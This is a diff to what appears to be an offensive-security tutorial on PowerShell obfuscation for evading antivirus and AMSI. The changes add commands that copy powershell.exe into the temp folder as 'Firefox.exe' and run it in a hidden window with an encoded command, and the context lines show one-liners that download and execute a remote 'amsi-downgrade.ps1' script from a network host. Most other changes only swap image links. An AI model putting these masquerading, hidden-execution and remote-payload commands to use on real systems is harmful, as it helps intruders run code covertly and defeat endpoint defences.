@@ -719,9 +719,10 @@ Here we can view the all process of encoding/decoding in powershell console
           rename it to Firefox.exe using an agent.bat before further ahead call the obfuscated
           powershell binary (Firefox.exe) to execute our powershell command line arguments.
 
-          cd $env:tmp && .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
+          Copy-Item "$env:windir\System32\Windowspowershell\v1.0\powershell.exe" -Destination "$env:tmp\Firefox.exe"
+          cd $env:tmp; .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
 
-![powershell rename](http://i.cubeupload.com/sl8UMD.jpg)
+![powershell rename](http://i63.tinypic.com/k0rhnt.jpg)
 
 <br />
 
@@ -732,7 +733,7 @@ Here we can view the all process of encoding/decoding in powershell console
           cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
           cmd.exe /c "set var=Get-ExecutionPolicy -List&& cmd.exe /c echo %var%^" | powershell.exe
 
-![powershell rename](http://i.cubeupload.com/W7bD5R.jpg)
+![powershell rename](http://i67.tinypic.com/in8keu.jpg)
 
 <br />
 
@@ -751,12 +752,12 @@ Here we can view the all process of encoding/decoding in powershell console
         powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
         Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
 
-![var declaration fail](http://i.cubeupload.com/b4lkyC.jpg)
+![var declaration fail](http://i66.tinypic.com/6jn238.jpg)
 
         [Using Invoke-Command statement wrapped in double quotes]
         powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
 
-![var declaration success](http://i.cubeupload.com/U5t83g.jpg)
+![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)
 
 ---
 
